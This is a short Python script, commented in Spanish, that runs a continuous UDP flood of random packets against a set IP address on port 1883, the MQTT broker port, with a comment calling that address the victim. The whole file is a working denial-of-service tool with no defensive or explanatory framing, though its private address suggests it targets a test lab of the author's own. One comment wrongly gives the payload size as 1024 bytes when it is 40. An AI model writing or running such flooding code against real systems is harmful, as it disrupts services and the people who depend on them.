import socket
import random
import time

TARGET_IP = "10.0.2.15"  # IP de la víctima (tu broker por ejemplo)
TARGET_PORT = 1883        # Puerto objetivo (UDP en este caso)

# Crear un socket UDP
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# Payload de datos aleatorios
payload = random._urandom(40)  # 1024 bytes de datos (puedes aumentar)

print(f"[*] Starting UDP Flood to {TARGET_IP}:{TARGET_PORT}")

try:
    while True:
        sock.sendto(payload, (TARGET_IP, TARGET_PORT))
        print(f"[+] Packet sent to {TARGET_IP}:{TARGET_PORT}")
        time.sleep(0.003)  # Controla la velocidad del flood (reduce si quieres más agresivo)
except KeyboardInterrupt:
    print("[!] Attack stopped by user")
